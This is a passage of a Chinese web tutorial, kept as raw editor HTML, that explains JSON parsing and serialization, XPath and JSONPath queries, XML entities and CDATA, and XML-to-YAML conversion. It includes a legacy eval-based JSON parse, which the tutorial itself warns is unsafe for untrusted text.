data-slate-leaf="true" data-offset-key="2507:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8428148751" data-annotation-type="annotation"><span 
data-slate-string="true">var</span></span></span><span data-slate-leaf="true" data-offset-key="2507:1"><span 
data-slate-string="true"> text = </span></span><span data-slate-leaf="true" data-offset-key="2507:2"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_9553134829" 
data-annotation-type="annotation"><span data-slate-string="true">`JSON 字符串`</span></span></span><span 
data-slate-leaf="true" data-offset-key="2507:3"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-731cabc0 " data-slate-type="paragraph" data-slate-object="block" data-key="2508"> 
<span data-slate-object="text" data-key="2509"><span data-slate-leaf="true" data-offset-key="2509:0" 
data-first-offset="true"><span data-slate-string="true">我们很轻松地就可以把它转化为 JavaScript 对象（反序列化），不需要任何第三方的 
parser：</span></span></span> </div> <div class="se-81956133 se-3761ba0b" data-slate-type="pre" 
data-slate-object="block" data-key="2510" data-code-language="javascript"> <div class="se-ceb2aff8 
se-c4cd95cf"> <span></span> </div> <div class="se-443d136b"> <div class="se-d01768fa se-4b692935" 
data-code-line-number="1"></div> </div> <div class="se-9deacf45 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2511"> <span data-slate-object="text" 
data-key="2512"><span data-slate-leaf="true" data-offset-key="2512:0" data-first-offset="true"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2643313262" 
data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="2512:1"><span data-slate-string="true"> obj = </span></span><span 
data-slate-leaf="true" data-offset-key="2512:2"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_0299221015" data-annotation-type="annotation"><span data-slate-string="true">JSON</span></span></span><span 
data-slate-leaf="true" data-offset-key="2512:3"><span data-slate-string="true">.parse(text);</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-0312e7f5 " data-slate-type="paragraph" data-slate-object="block" data-key="2513"> 
<span data-slate-object="text" data-key="2514"><span data-slate-leaf="true" data-offset-key="2514:0" 
data-first-offset="true"><span data-slate-string="true">在早些时候的 ES 版本中，这个方法不支持，那么还可以使用 eval 
大法，效果是一样的：</span></span></span> </div> <div class="se-a7501776 se-771af9ed" data-slate-type="pre" 
data-slate-object="block" data-key="2515" data-code-language="javascript"> <div class="se-f05ca8ec 
se-350b22fa"> <span></span> </div> <div class="se-19459271"> <div class="se-42f040e8 se-e37e527b" 
data-code-line-number="1"></div> </div> <div class="se-d567fc11 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2516"> <span data-slate-object="text" 
data-key="2517"><span data-slate-leaf="true" data-offset-key="2517:0" data-first-offset="true"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2187850043" 
data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:1"><span data-slate-string="true"> obj = </span></span><span 
data-slate-leaf="true" data-offset-key="2517:2"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_8774416132" data-annotation-type="annotation"><span data-slate-string="true">eval</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:3"><span data-slate-string="true">(</span></span><span 
data-slate-leaf="true" data-offset-key="2517:4"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6725982683" data-annotation-type="annotation"><span data-slate-string="true">''(''</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:5"><span data-slate-string="true"> + text + </span></span><span 
data-slate-leaf="true" data-offset-key="2517:6"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8882411575" data-annotation-type="annotation"><span data-slate-string="true">'')''</span></span></span><span 
data-slate-leaf="true" data-offset-key="2517:7"><span data-slate-string="true">);</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-5d54dbc5 " data-slate-type="paragraph" data-slate-object="block" data-key="2518"> 
<span data-slate-object="text" data-key="2519"><span data-slate-leaf="true" data-offset-key="2519:0" 
data-first-offset="true"><span data-slate-string="true">不过，在现代浏览器中，如果 text 不是绝对安全的，就不要使用这样的方法，因为 
eval 可以执行任何恶意代码。</span></span></span> </div> <div class="se-afee7ba0 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2520"> <span data-slate-object="text" data-key="2521"><span 
data-slate-leaf="true" data-offset-key="2521:0" data-first-offset="true"><span data-slate-string="true">当然，我们也可以把 
JavaScript 对象转换回（序列化）JSON 文本：</span></span></span> </div> <div class="se-c47e80a2 se-134f2613" 
data-slate-type="pre" data-slate-object="block" data-key="2522" data-code-language="javascript"> 
<div class="se-ab3dac82 se-5fca0c83"> <span></span> </div> <div class="se-13f8df6c"> <div class="se-641ef65d 
se-861028e8" data-code-line-number="1"></div> </div> <div class="se-cf02ea90 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2523"> <span data-slate-object="text" 
data-key="2524"><span data-slate-leaf="true" data-offset-key="2524:0" data-first-offset="true"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5121575037" 
data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="2524:1"><span data-slate-string="true"> serializedText 
= </span></span><span data-slate-leaf="true" data-offset-key="2524:2"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_4509367757" data-annotation-type="annotation"><span 
data-slate-string="true">JSON</span></span></span><span data-slate-leaf="true" data-offset-key="2524:3"><span 
data-slate-string="true">.stringify(obj);</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-0fc07ad9 
" data-slate-type="paragraph" data-slate-object="block" data-key="2525"> <span data-slate-object="text" 
data-key="2526"><span data-slate-leaf="true" data-offset-key="2526:0" data-first-offset="true"><span 
data-slate-string="true">完成以后，先不要关闭控制台，下面还会用到。</span></span></span> </div> <h3 class="se-6399a787" 
data-slate-type="heading" data-slate-object="block" data-key="2527"><span data-slate-object="text" 
data-key="2528"><span data-slate-leaf="true" data-offset-key="2528:0" data-first-offset="true"><span 
data-slate-string="true">3. 路径表达式</span></span></span></h3> <div class="se-5dee419e " data-slate-type="paragraph" 
data-slate-object="block" data-key="2529"> <span data-slate-object="text" data-key="2530"><span 
data-slate-leaf="true" data-offset-key="2530:0" data-first-offset="true"><span data-slate-string="true">对于一段巨大的 
XML 或 JSON 文本，我们经常需要找出其中特定的一个或多个节点（tag）、内容（content）或者属性，二者都有相似的方法。</span></span></span> </div> 
<div class="se-eb112edb " data-slate-type="paragraph" data-slate-object="block" data-key="2531"> 
<span data-slate-object="text" data-key="2532"><span data-slate-leaf="true" data-offset-key="2532:0" 
data-first-offset="true"><span data-slate-string="true">对于 XML 来说，它就是 XPath，也是 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2533" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2534"><span data-slate-leaf="true" data-offset-key="2534:0" 
data-first-offset="true"><span data-slate-string="true">W3C 的标准</span></span></span></a><span 
data-slate-object="text" data-key="2535"><span data-slate-leaf="true" data-offset-key="2535:0" 
data-first-offset="true"><span data-slate-string="true">。现在我们来动手操作一下吧：</span></span></span> 
</div> <div class="se-0dbbb791 " data-slate-type="paragraph" data-slate-object="block" data-key="2536"> 
<span data-slate-object="text" data-key="2537"><span data-slate-leaf="true" data-offset-key="2537:0" 
data-first-offset="true"><span data-slate-string="true">我们可以利用 Xpath Generator 来直观地生成相应的 XPath。让我们打开</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2538" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2539"><span data-slate-leaf="true" data-offset-key="2539:0" 
data-first-offset="true"><span data-slate-string="true">这个工具</span></span></span></a><span 
data-slate-object="text" data-key="2540"><span data-slate-leaf="true" data-offset-key="2540:0" 
data-first-offset="true"><span data-slate-string="true">，找到我们刚才保存下来的 cities.xml 文件，拷贝里面的内容，粘贴到页面上。</span></span></span> 
</div> <div class="se-e6892ecd" data-slate-type="image" data-slate-object="block" data-key="2541"> 
<img class="se-a148a510" src="https://static001.geekbang.org/resource/image/36/98/3612154fb3c1fb8781c1e94388868798.png"> 
</div> <div class="se-81cc1e12 " data-slate-type="paragraph" data-slate-object="block" data-key="2542"> 
<span data-slate-object="text" data-key="2543"><span data-slate-leaf="true" data-offset-key="2543:0" 
data-first-offset="true"><span data-slate-string="true">接着，点击第一个 id 标签，你将看到这样的 XPath：</span></span></span> 
</div> <div class="se-3a5ca498 se-13f0fe02" data-slate-type="pre" data-slate-object="block" 
data-key="2544" data-code-language="objectivec"> <div class="se-0e1f95f4 se-de997c9f"> <span></span> 
</div> <div class="se-0e880380"> <div class="se-37356a56 se-bbc8a7d4" data-code-line-number="1"></div> 
</div> <div class="se-c0c37f4b ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2545"> <span data-slate-object="text" data-key="2546"><span 
data-slate-leaf="true" data-offset-key="2546:0" data-first-offset="true"><span data-slate-string="true">/cities/city[</span></span><span 
data-slate-leaf="true" data-offset-key="2546:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8083813922" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2546:2"><span data-slate-string="true">]/</span></span><span 
data-slate-leaf="true" data-offset-key="2546:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3163210251" data-annotation-type="annotation"><span data-slate-string="true">id</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-bf49d809 " data-slate-type="paragraph" data-slate-object="block" data-key="2547"> 
<span data-slate-object="text" data-key="2548"><span data-slate-leaf="true" data-offset-key="2548:0" 
data-first-offset="true"><span data-slate-string="true">这就唯一确定了 XML 中，cities 这个节点下，city 节点中的第一个，它下面的 
id 节点。</span></span></span> </div> <div class="se-4e36d07f " data-slate-type="paragraph" data-slate-object="block" 
data-key="2549"> <span data-slate-object="text" data-key="2550"><span data-slate-leaf="true" 
data-offset-key="2550:0" data-first-offset="true"><span data-slate-string="true">我们再来试一试，点击 
Shanghai 这个 content，你将看到：</span></span></span> </div> <div class="se-3ecc001f se-d0cac6e2" 
data-slate-type="pre" data-slate-object="block" data-key="2551"> <div class="se-51bbff9a se-d335c55d"> 
<span></span> </div> <div class="se-a3640d9d"> <div class="se-ba437450 se-2780cc0c" data-code-line-number="1"></div> 
</div> <div class="se-cf993b7d ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2552"> <span data-slate-object="text" data-key="2553"><span 
data-slate-leaf="true" data-offset-key="2553:0" data-first-offset="true"><span data-slate-string="true">/cities/city[2]/name/text()</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-ed92940a " data-slate-type="paragraph" data-slate-object="block" data-key="2554"> 
<span data-slate-object="text" data-key="2555"><span data-slate-leaf="true" data-offset-key="2555:0" 
data-first-offset="true"><span data-slate-string="true">对于 JSON 来说，也有 JSONPath 这样的东西，但是，我们却很少提及它，因为正如上文我提到的，它和 
JavaScript 极强的亲和力。我们在前端代码中已经不自觉地通过对象的点操作符，或是数组的下标操作符使用了，于是，JSONPath 在多数场景中就显得不那么重要了。</span></span></span> 
</div> <div class="se-8f31472a " data-slate-type="paragraph" data-slate-object="block" data-key="2556"> 
<span data-slate-object="text" data-key="2557"><span data-slate-leaf="true" data-offset-key="2557:0" 
data-first-offset="true"><span data-slate-string="true">举例来说，上面我给出的两个 XPath 例子，我们在将 cities.json 
反序列化成 JavaScript 对象以后，我们可以直接访问（你可以在前面实践的控制台上，继续键入）：</span></span></span> </div> <div class="se-00a283da 
se-33cfd03b" data-slate-type="pre" data-slate-object="block" data-key="2558"> <div class="se-4589cc9a 
se-a811fcf4"> <span></span> </div> <div class="se-5f98b782"> <div class="se-7630bf28 se-875735b2" 
data-code-line-number="1"></div> </div> <div class="se-8a497793 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2559"> <span data-slate-object="text" 
data-key="2560"><span data-slate-leaf="true" data-offset-key="2560:0" data-first-offset="true"><span 
data-slate-string="true">obj.cities[0].id</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-7e1a0a0b 
" data-slate-type="paragraph" data-slate-object="block" data-key="2561"> <span data-slate-object="text" 
data-key="2562"><span data-slate-leaf="true" data-offset-key="2562:0" data-first-offset="true"><span 
data-slate-string="true">以及：</span></span></span> </div> <div class="se-d3c5092c se-4c0d13c1" 
data-slate-type="pre" data-slate-object="block" data-key="2563" data-code-language="javascript"> 
<div class="se-cd4e15ff se-9663266b"> <span></span> </div> <div class="se-e1e5a911"> <div class="se-b51cddcd 
se-27d5e066" data-code-line-number="1"></div> </div> <div class="se-c2bdbf32 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2564"> <span data-slate-object="text" 
data-key="2565"><span data-slate-leaf="true" data-offset-key="2565:0" data-first-offset="true"><span 
data-slate-string="true">obj[</span></span><span data-slate-leaf="true" data-offset-key="2565:1"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_3093836823" 
data-annotation-type="annotation"><span data-slate-string="true">''cities''</span></span></span><span 
data-slate-leaf="true" data-offset-key="2565:2"><span data-slate-string="true">][</span></span><span 
data-slate-leaf="true" data-offset-key="2565:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9958624362" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span><span 
data-slate-leaf="true" data-offset-key="2565:4"><span data-slate-string="true">].name</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-495f20ce " data-slate-type="paragraph" data-slate-object="block" data-key="2566"> 
<span data-slate-object="text" data-key="2567"><span data-slate-leaf="true" data-offset-key="2567:0" 
data-first-offset="true"><span data-slate-string="true">但是，还有很多场景，特别是对于 JSON 支持不像 JavaScript 
那么足够的场景，JSONPath 就有其用武之地了。和前面介绍的 XPath 查找的例子一样，你可以打开 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2568" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2569"><span data-slate-leaf="true" data-offset-key="2569:0" data-first-offset="true"><span 
data-slate-string="true">JSON Path Finder</span></span></span></a><span data-slate-object="text" 
data-key="2570"><span data-slate-leaf="true" data-offset-key="2570:0" data-first-offset="true"><span 
data-slate-string="true"> 页面，把之前 cities.json 的文本粘贴到左侧的输入框中，在右侧选择对应的节点或值，上方就会显示出 JSONPath 了：</span></span></span> 
</div> <div class="se-ea1aaadc" data-slate-type="image" data-slate-object="block" data-key="2571"> 
<img class="se-fbc41a0f" src="https://static001.geekbang.org/resource/image/33/11/33060ae88d70328e2d8c0ea24bd8af11.png"> 
</div> <div class="se-d1fd3aaa " data-slate-type="paragraph" data-slate-object="block" data-key="2572"> 
<span data-slate-object="text" data-key="2573"><span data-slate-leaf="true" data-offset-key="2573:0" 
data-first-offset="true"><span data-slate-string="true">所以，Beijing 的 id 和 Shanghai 的 name 分别显示为：</span></span></span> 
</div> <div class="se-516c76f6 se-cd4f6307" data-slate-type="pre" data-slate-object="block" 
data-key="2574"> <div class="se-dedc5fe2 se-3fda8213"> <span></span> </div> <div class="se-2791c879"> 
<div class="se-3bfe589c se-7b84898c" data-code-line-number="1"></div> <div class="se-3bfe589c 
se-7b84898c" data-code-line-number="2"></div> </div> <div class="se-5222d9cd ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2575"> <span data-slate-object="text" 
data-key="2576"><span data-slate-leaf="true" data-offset-key="2576:0" data-first-offset="true"><span 
data-slate-string="true">x.cities[0].id</span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2577"> <span data-slate-object="text" 
data-key="2578"><span data-slate-leaf="true" data-offset-key="2578:0" data-first-offset="true"><span 
data-slate-string="true">x.cities[1].name</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-6b5d25ef 
" data-slate-type="paragraph" data-slate-object="block" data-key="2579"> <span data-slate-object="text" 
data-key="2580"><span data-slate-leaf="true" data-offset-key="2580:0" data-first-offset="true"><span 
data-slate-string="true">这和 JavaScript 对象访问的表达式是一致的。</span></span></span> </div> <h3 class="se-fbb7bd9b" 
data-slate-type="heading" data-slate-object="block" data-key="2581"><span data-slate-object="text" 
data-key="2582"><span data-slate-leaf="true" data-offset-key="2582:0" data-first-offset="true"><span 
data-slate-string="true">4. 特殊字符</span></span></span></h3> <div class="se-2abb2140 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2583"> <span data-slate-object="text" data-key="2584"><span 
data-slate-leaf="true" data-offset-key="2584:0" data-first-offset="true"><span data-slate-string="true">任何格式都要使用特定的字符来表示结构和关系，那么 
XML 和 JSON 也不例外，这些特定字符，如果被用来表示实际内容，就会出现“冲突”，于是我们就需要转义。</span></span></span> </div> <div class="se-c8f9ad38 
" data-slate-type="paragraph" data-slate-object="block" data-key="2585"> <span data-slate-object="text" 
data-key="2586"><span data-slate-leaf="true" data-offset-key="2586:0" data-first-offset="true"><span 
data-slate-string="true">对于 XML 来说，且看下面的表格，第三列是“预定义实体”，也就是字符转义后相应的形式：</span></span></span> 
</div> <div class="se-2205c5bd" data-slate-type="image" data-slate-object="block" data-key="2587"> 
<img class="se-962a9136" src="https://static001.geekbang.org/resource/image/27/13/275ae26a648e6b40a577b73aa6bcee13.jpg"> 
</div> <div class="se-b1ae8a2d " data-slate-type="paragraph" data-slate-object="block" data-key="2588"> 
<span data-slate-object="text" data-key="2589"><span data-slate-leaf="true" data-offset-key="2589:0" 
data-first-offset="true"><span data-slate-string="true">值得一提的是，在 XML 中，我们还能够以 CDATA 来表示内容，这种方式可以尽可能地避免对于转义的使用，并可以直接使用换行等控制字符，增加 
XML 的可读性。比方说下面这个例子，实际的 function 使用 CDATA 的方式给嵌在了 function 这个 tag 内：</span></span></span> </div> 
<div class="se-c313d4fe se-58701fce" data-slate-type="pre" data-slate-object="block" data-key="2590" 
data-code-language="typescript"> <div class="se-d7dd8872 se-9f7a09c3"> <span></span> </div> 
<div class="se-0b99e7da"> <div class="se-a611e806 se-0272b86d" data-code-line-number="1"></div> 
<div class="se-a611e806 se-0272b86d" data-code-line-number="2"></div> <div class="se-a611e806 
se-0272b86d" data-code-line-number="3"></div> <div class="se-a611e806 se-0272b86d" data-code-line-number="4"></div> 
<div class="se-a611e806 se-0272b86d" data-code-line-number="5"></div> </div> <div class="se-47812690 
ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2591"> <span data-slate-object="text" data-key="2592"><span data-slate-leaf="true" 
data-offset-key="2592:0" data-first-offset="true"><span data-slate-string="true">&lt;</span></span><span 
data-slate-leaf="true" data-offset-key="2592:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2525850969" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5709729979" data-annotation-type="annotation"><span 
data-slate-string="true">function</span></span></span></span><span data-slate-leaf="true" data-offset-key="2592:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5709729979" 
data-annotation-type="annotation"><span data-slate-string="true">&gt;&lt;![</span></span></span><span 
data-slate-leaf="true" data-offset-key="2592:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5709729979" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6128541323" data-annotation-type="annotation"><span 
data-slate-string="true">CDATA</span></span></span></span><span data-slate-leaf="true" data-offset-key="2592:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5709729979" 
data-annotation-type="annotation"><span data-slate-string="true">[</span></span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2593"> <span data-slate-object="text" data-key="2594"><span data-slate-leaf="true" 
data-offset-key="2594:0" data-first-offset="true"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_6101738485" data-annotation-type="annotation"><span data-slate-string="true">function 
compare(a, b) </span></span></span><span data-slate-leaf="true" data-offset-key="2594:1"><span 
data-slate-string="true">{</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2595"> <span data-slate-object="text" 
data-key="2596"><span data-slate-leaf="true" data-offset-key="2596:0" data-first-offset="true"><span 
data-slate-string="true"> ...</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2597"> <span data-slate-object="text" 
data-key="2598"><span data-slate-leaf="true" data-offset-key="2598:0" data-first-offset="true"><span 
data-slate-string="true">}</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2599"> <span data-slate-object="text" 
data-key="2600"><span data-slate-leaf="true" data-offset-key="2600:0" data-first-offset="true"><span 
data-slate-string="true">]]&gt;&lt;/</span></span><span data-slate-leaf="true" data-offset-key="2600:1"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_9790350128" 
data-annotation-type="annotation"><span data-slate-string="true">function&gt;</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-be288bff " data-slate-type="paragraph" data-slate-object="block" data-key="2601"> 
<span data-slate-object="text" data-key="2602"><span data-slate-leaf="true" data-offset-key="2602:0" 
data-first-offset="true"><span data-slate-string="true">对于 JSON 来说，没有这样的预定义实体，但是我们也经常需要转义，比如说，如果双引号出现在了一对双引号内的字符串中，这时候我们可以用常规的反斜杠</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2603" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="2604"><span data-slate-leaf="true" data-offset-key="2604:0" 
data-first-offset="true"><span data-slate-string="true">转义序列</span></span></span></a><span 
data-slate-object="text" data-key="2605"><span data-slate-leaf="true" data-offset-key="2605:0" 
data-first-offset="true"><span data-slate-string="true">来表示，比如引号“转义为 \”等。</span></span></span> 
</div> <h2 class="se-f63a0b4d" data-slate-type="heading" data-slate-object="block" data-key="2606"><span 
data-slate-object="text" data-key="2607"><span data-slate-leaf="true" data-offset-key="2607:0" 
data-first-offset="true"><span data-slate-string="true">审视一番 YAML</span></span></span></h2> 
<div class="se-3617011d " data-slate-type="paragraph" data-slate-object="block" data-key="2608"> 
<span data-slate-object="text" data-key="2609"><span data-slate-leaf="true" data-offset-key="2609:0" 
data-first-offset="true"><span data-slate-string="true">最后来讲一讲 YAML，这是一种可读性非常优秀的数据交换语言。如果你使用过 
Python，那么对于其“有意义”的缩进应该印象深刻，而 YAML，也具备这样的特点。你可以打开 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2610" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2611"><span data-slate-leaf="true" data-offset-key="2611:0" data-first-offset="true"><span 
data-slate-string="true">XML to YAML Converter</span></span></span></a><span data-slate-object="text" 
data-key="2612"><span data-slate-leaf="true" data-offset-key="2612:0" data-first-offset="true"><span 
data-slate-string="true"> 这个网站，然后将前面我们创建的 cities.xml 的内容拷贝出来，贴到左侧的输入框中：</span></span></span> 
</div> <div class="se-f44ee931" data-slate-type="image" data-slate-object="block" data-key="2613"> 
<img class="se-10327527" src="https://static001.geekbang.org/resource/image/3a/8d/3a4473188cfb646fe2f66e1311630e8d.png"> 
</div> <div class="se-9576bf5a " data-slate-type="paragraph" data-slate-object="block" data-key="2614"> 
<span data-slate-object="text" data-key="2615"><span data-slate-leaf="true" data-offset-key="2615:0" 
data-first-offset="true"><span data-slate-string="true">然后点击 XML TO YAML 按钮，你就能看到前面的例子，如果使用 
YAML 来表示，它会是这么个样子：</span></span></span> </div> <div class="se-ab0162a8 se-d2b3341d" data-slate-type="pre" 
data-slate-object="block" data-key="2616" data-code-language="objectivec"> <div class="se-e1ec1c2a 
se-68b47c83"> <span></span> </div> <div class="se-7a68ca9a"> <div class="se-be35eafb se-eaa4abea" 
data-code-line-number="1"></div> <div class="se-be35eafb se-eaa4abea" data-code-line-number="2"></div> 
<div class="se-be35eafb se-eaa4abea" data-code-line-number="3"></div> <div class="se-be35eafb 
se-eaa4abea" data-code-line-number="4"></div> <div class="se-be35eafb se-eaa4abea" data-code-line-number="5"></div> 
<div class="se-be35eafb se-eaa4abea" data-code-line-number="6"></div> <div class="se-be35eafb 
se-eaa4abea" data-code-line-number="7"></div> <div class="se-be35eafb se-eaa4abea" data-code-line-number="8"></div> 
</div> <div class="se-57089d6d ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2617"> <span data-slate-object="text" data-key="2618"><span 
data-slate-leaf="true" data-offset-key="2618:0" data-first-offset="true"><span data-slate-string="true">cities: 
</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2619"> <span data-slate-object="text" data-key="2620"><span 
data-slate-leaf="true" data-offset-key="2620:0" data-first-offset="true"><span data-slate-string="true"> 
city: </span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2621"> <span data-slate-object="text" data-key="2622"><span 
data-slate-leaf="true" data-offset-key="2622:0" data-first-offset="true"><span data-slate-string="true"> 
- </span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2623"> <span data-slate-object="text" data-key="2624"><span 
data-slate-leaf="true" data-offset-key="2624:0" data-first-offset="true"><span data-slate-string="true"> 
name: Beijing</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2625"> <span data-slate-object="text" data-key="2626"><span 
data-slate-leaf="true" data-offset-key="2626:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="2626:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1326968000" data-annotation-type="annotation"><span 
data-slate-string="true">id</span></span></span><span data-slate-leaf="true" data-offset-key="2626:2"><span 
data-slate-string="true">: </span></span><span data-slate-leaf="true" data-offset-key="2626:3"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_1703801093" 
data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2627"> <span data-slate-object="text" data-key="2628"><span data-slate-leaf="true" 
data-offset-key="2628:0" data-first-offset="true"><span data-slate-string="true"> - </span></span></span> 
